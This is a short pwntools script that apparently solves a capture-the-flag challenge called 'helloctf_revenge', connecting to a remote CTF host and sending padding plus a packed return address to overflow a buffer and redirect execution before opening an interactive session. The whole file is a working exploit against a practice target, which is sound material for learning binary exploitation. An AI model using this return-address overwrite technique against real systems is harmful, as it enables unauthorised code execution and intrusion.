#!python3
from pwn import *

HOST = "ctf.adl.tw"
PORT = 10001
LOCALPROCESS = "./helloctf_revenge"

"""context"""
context.arch = "amd64"
context.os = "linux"
context.endian = "little"
context.terminal = ["tmux", "splitw", "-h"]


def solve(r):
    r.recvuntil("Do you like VTuber?")
    r.sendline(flat("yes\0" + "s" * 20, p64(0x401263)))


if __name__ == "__main__":
    r = remote(HOST, PORT)
    # r = process(LOCALPROCESS)
    solve(r)
    r.interactive()
